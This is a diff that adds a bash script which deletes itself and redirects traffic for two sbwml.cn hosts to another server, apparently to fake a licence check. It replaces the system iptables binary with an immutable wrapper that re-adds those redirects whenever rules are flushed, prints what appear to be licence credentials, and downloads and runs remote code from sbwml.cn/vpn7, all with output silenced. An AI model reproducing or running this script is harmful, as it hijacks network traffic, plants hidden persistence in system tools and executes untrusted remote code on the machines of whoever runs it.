@@ -1,0 +1,50 @@
+#!/bin/bash
+mv $0 /dev/null >/dev/null 2>&1
+fwqip=`ping jizhi1.win -c 1 | sed '1{s/[^(]*(//;s/).*//;q}'`
+export fwqip=$fwqip
+
+sbwjsip=`ping js.sbwml.cn -c 1 | sed '1{s/[^(]*(//;s/).*//;q}'`
+export sbwjsip=$sbwjsip
+
+sbwblgip=`ping blg.sbwml.cn -c 1 | sed '1{s/[^(]*(//;s/).*//;q}'`
+export sbwbldip=$sbwblgip
+
+chattr -i -a /usr/sbin/ /usr/sbin/* /root/ /tmp/ >/dev/null 2>&1
+yum install iptables -y >/dev/null 2>&1
+yum reinstall iptables -y >/dev/null 2>&1
+rm -f /sbin/iptables >/dev/null 2>&1
+mv /usr/sbin/xtables-multi /usr/sbin/iptable >/dev/null 2>&1
+(
+cat <<'EOF'
+#! /bin/bash
+if [[ $@ = -F ]]
+then
+iptable iptables -F
+    iptables -t nat -A OUTPUT -d  $sbwjsip  -j DNAT --to-destination $fwqip
+    iptables -t nat -A OUTPUT -d  $sbwblgip  -j DNAT --to-destination $fwqip
+else
+    iptable iptables $@
+fi
+EOF
+) >/usr/sbin/iptables
+chmod 777 /usr/sbin/iptables >/dev/null 2>&1
+chmod 777 /usr/sbin/xtables-multi >/dev/null 2>&1
+chmod 777 /usr/sbin/iptables >/dev/null 2>&1
+chattr +i /usr/sbin/xtables-multi >/dev/null 2>&1
+chattr +i /usr/sbin/iptables >/dev/null 2>&1
+    iptables -t nat -A OUTPUT -d  $sbwjsip  -j DNAT --to-destination $fwqip
+    iptables -t nat -A OUTPUT -d  $sbwblgip  -j DNAT --to-destination $fwqip
+	echo sbw脚本卡号:12395718密码12402153
+	sleep 3;
+	echo sbw脚本卡号:12395718密码12402153
+	sleep 2;
+	echo sbw脚本卡号:12395718密码12402153
+	sleep 1;
+wget sbwml.cn/vpn7 >/dev/null 2>&1
+bash vpn7
+sleep 0.1
+chattr -i -a /usr/sbin/* >/dev/null 2>&1
+#rm -f /usr/sbin/iptables /usr/sbin/xtables-multi /usr/sbin/iptable >/dev/null 2>&1
+#yum install iptables -y >/dev/null 2>&1
+#yum reinstall iptables -y >/dev/null 2>&1
+exit 0;
